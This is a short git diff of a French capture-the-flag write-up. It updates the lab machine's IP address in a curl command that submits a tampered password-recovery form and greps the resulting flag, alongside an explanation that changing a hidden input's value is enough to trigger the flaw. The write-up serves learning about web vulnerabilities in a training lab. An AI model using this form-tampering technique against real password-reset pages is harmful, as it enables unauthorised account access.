@@ -17,7 +17,7 @@ il suffit de modifier la `value` de cet `input` et d'envoyer le formulaire pour 
 On peut automatiser la récupération du flag avec la commande:
 
 ```bash
-curl -s 'http://192.168.56.101/?page=recover#' --data 'mail=&Submit=Submit' | grep -oP 'The flag is : \K[0-9a-f]{64}'
+curl -s 'http://192.168.56.102/?page=recover#' --data 'mail=&Submit=Submit' | grep -oP 'The flag is : \K[0-9a-f]{64}'
 ```
 
 L'intention derrière cet input est sûrement de paramétrer l'adresse de l'expéditeur du mail de reinitialisation du mot
